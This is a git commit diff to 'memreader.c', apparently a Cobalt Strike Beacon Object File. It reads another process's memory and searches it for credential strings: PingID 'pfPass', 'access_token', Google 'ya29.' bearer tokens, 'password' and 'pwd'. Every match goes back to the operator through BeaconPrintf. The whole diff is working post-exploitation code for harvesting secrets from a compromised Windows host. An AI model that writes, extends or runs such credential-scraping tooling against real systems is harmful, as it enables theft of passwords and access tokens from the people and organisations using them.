fc78219941318e83f42a81db773fcff3ef22d905
Kali <kyleh204@gmail.com>
2022-05-12 14:41:49 -0400

    Added common Keyword Array

--- memreader.c
+++ memreader.c
@@ -2,6 +2,7 @@
 #include <windows.h>
 #include "beacon.h"
 
+#define PATTERN_SIZE 5
 
 WINBASEAPI HANDLE WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
@@ -11,6 +12,7 @@ WINBASEAPI void *__cdecl MSVCRT$memchr(void * ptr, int value, size_t num );
 WINBASEAPI int __cdecl MSVCRT$memcmp( const void * ptr1, const void * ptr2, size_t num );
 WINBASEAPI size_t __cdecl MSVCRT$strlen( const char * str );
 WINBASEAPI int __cdecl MSVCRT$sprintf(char *, const char *, ...);
+
 	
 static  unsigned char* find_all(unsigned char* buffer, SIZE_T bufferLen, unsigned char* pattern, SIZE_T patternLen) {
     unsigned char* match = NULL;
@@ -36,7 +38,22 @@ static  unsigned char* find_all(unsigned char* buffer, SIZE_T bufferLen, unsigne
     return NULL;
 }
 
-void find_locs(HANDLE process, char* pattern, SIZE_T sz) {
+void find_locs(HANDLE process, SIZE_T sz) {
+    // add values as needed / adjust PATTERN_SIZE to match
+    const char * pattern[PATTERN_SIZE];
+    
+    char ping[] = "pfPass";
+    char access[] = "access_token";
+    char google[] = "ya29.";
+    char pass[] = "password";
+    char pwd[] = "pwd";
+
+    pattern[0] = ping;    // pingID https://support.pingidentity.com/servlet/servlet.FileDownload?file=00P1W00001Vvc0jUAB
+    pattern[1] = access;  // google APIs Bearer token
+    pattern[2] = google;  // google APIs Bearer token
+    pattern[3] = pass;    // generic password
+    pattern[4] = pwd;     // generic password 
+       
     unsigned char* p = NULL;
     MEMORY_BASIC_INFORMATION info; 
     for (p = NULL; KERNEL32$VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info); p += info.RegionSize)
@@ -47,15 +64,18 @@ void find_locs(HANDLE process, char* pattern, SIZE_T sz) {
 
         if (info.State == MEM_COMMIT &&
             (info.Type == MEM_MAPPED || info.Type == MEM_PRIVATE))
-        {
-            SIZE_T bytes_read;
-            tempBuffer = MSVCRT$calloc(info.RegionSize, sizeof(tempBuffer));
-            KERNEL32$ReadProcessMemory(process, p, &tempBuffer[0], info.RegionSize, &bytes_read);
-            unsigned char* match = find_all(tempBuffer, bytes_read, pattern, MSVCRT$strlen(pattern));
-	    if (match) {
-		char * fmt = MSVCRT$calloc(40, sizeof(char));
-		MSVCRT$sprintf(fmt, "[*] MATCH FOUND : %%.%ds \n", sz);
-                BeaconPrintf(CALLBACK_OUTPUT, fmt, match);
+            {
+                SIZE_T bytes_read;
+                tempBuffer = MSVCRT$calloc(info.RegionSize, sizeof(tempBuffer));
+                KERNEL32$ReadProcessMemory(process, p, &tempBuffer[0], info.RegionSize, &bytes_read);
+                
+                for (int i = 0; i < PATTERN_SIZE; i++){
+                    unsigned char* match = find_all(tempBuffer, bytes_read, pattern[i], MSVCRT$strlen(pattern[i]));
+            	    if (match) {
+            		char * fmt = MSVCRT$calloc(40, sizeof(char));
+            		MSVCRT$sprintf(fmt, "[*] MATCH FOUND : %%.%ds \n", sz);
+                    BeaconPrintf(CALLBACK_OUTPUT, fmt, match);
+                }
             }
         }
     }
@@ -65,9 +85,9 @@ int go(char* argc, int len) {
     datap parser;
     BeaconDataParse(&parser, argc, len);
     int pid = BeaconDataInt(&parser);
-    char* pattern = BeaconDataExtract(&parser, NULL);
     int sz = BeaconDataInt(&parser);
+   
     HANDLE process = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
-    find_locs(process, pattern, sz);
+    find_locs(process, sz);
     return 0;
 }
